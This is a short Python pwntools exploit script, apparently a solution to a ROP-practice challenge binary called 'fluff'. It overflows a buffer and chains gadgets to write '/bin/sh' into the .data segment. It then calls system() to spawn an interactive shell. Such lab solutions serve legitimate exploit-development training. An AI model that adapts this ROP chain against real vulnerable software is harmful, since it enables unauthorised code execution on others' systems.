from pwn import *

'''
00000000004005e0 <system@plt>:
  4005e0:	ff 25 3a 0a 20 00    	jmpq   *0x200a3a(%rip)        # 601020 <system@GLIBC_2.2.5>

25 0x00001050    16 0x00601050    16 -rw- .data

write to r10
0x0000000000400822: xor r11, r11; pop r14; mov edi, 0x601050; ret; 
0x0000000000400832: pop r12; mov r13d, 0x604060; ret; 
0x000000000040082f: xor r11, r12; pop r12; mov r13d, 0x604060; ret; 
0x0000000000400840: xchg r11, r10; pop r15; mov r11d, 0x602050; ret; 

write to r11
0x0000000000400822: xor r11, r11; pop r14; mov edi, 0x601050; ret; 
0x0000000000400832: pop r12; mov r13d, 0x604060; ret; 
0x000000000040082f: xor r11, r12; pop r12; mov r13d, 0x604060; ret

final gadget r10,r11
0x000000000040084d: pop rdi; mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret;

0x00000000004008c3: pop rdi; ret; 
'''

def write(string,address):
#write to r10
	rop = p64(0x0000000000400822) #: xor r11, r11; pop r14; mov edi, 0x601050; ret; 
	rop += p64(0xdeadbeef) # pop r14
	rop += p64(0x0000000000400832) #: pop r12; mov r13d, 0x604060; ret; 
	rop += p64(address)
	rop += p64(0x000000000040082f) #: xor r11, r12; pop r12; mov r13d, 0x604060; ret; 
	rop += p64(0xdeadbeef) #pop r12
	rop += p64(0x0000000000400840) #: xchg r11, r10; pop r15; mov r11d, 0x602050; ret; 
	rop += p64(0xdeadbeed) #pop r15
#write to r11
	rop += p64(0x0000000000400822) #: xor r11, r11; pop r14; mov edi, 0x601050; ret; 
	rop += p64(0xdeadbeef) #pop r14
	rop += p64(0x0000000000400832) #: pop r12; mov r13d, 0x604060; ret; 
	rop += string
	rop += p64(0x000000000040082f) #: xor r11, r12; pop r12; mov r13d, 0x604060; ret
	rop += p64(0xdeadbeef) #pop r12
#final gadget r10,r11
	rop += p64(0x000000000040084d) #: pop rdi; mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret;
	rop += p64(0xdeadbeef) #pop rdi
	rop += p64(0xdeadbeef) #pop r13
	rop += p64(0) #pop r12

	return rop

def main():
	system_plt = 0x00000000004005e0
	data_segment = 0x00601050
	pop_rdi = 0x00000000004008c3
	payload = "A" * 40
	payload += write('/bin/sh\x00',data_segment)

	payload += p64(pop_rdi)
	payload += p64(data_segment)
	payload += p64(system_plt)

	p = process('./fluff')
	print p.recvrepeat(0.2)
	p.sendline(payload)
	p.interactive()


if __name__ == '__main__':
	main()
